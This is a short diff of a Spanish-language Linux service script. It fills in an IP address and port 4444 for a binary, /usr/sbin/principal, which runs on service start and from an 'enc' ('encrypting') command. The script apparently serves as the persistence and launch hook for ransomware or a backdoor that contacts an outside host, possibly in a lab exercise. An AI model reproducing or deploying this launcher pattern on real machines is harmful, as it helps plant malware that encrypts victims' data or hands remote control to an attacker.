@@ -19,15 +19,15 @@ case $1 in
         echo "$(date): corrio $1" >> $LOG_FILE
 
 	if [ -f /root/flag.ntd ];then
-		/usr/sbin/principal [IP] [PORT]
+		/usr/sbin/principal 192.168.0.24 4444
 	fi
 	;;
     stop)
 	echo "$(date): se detuvo" >> $LOG_FILE
         ;;
     enc)
-	echo "$(date): cifrando" >> $LOG_FILE
-        /usr/sbin/principal [IP] [PORT]
+	echo "$(date): cifrando uwu" >> $LOG_FILE
+        /usr/sbin/principal 192.168.0.24 4444
 	;;
     status)
 	echo "$(date): se analizo el estado" >> $LOG_FILE
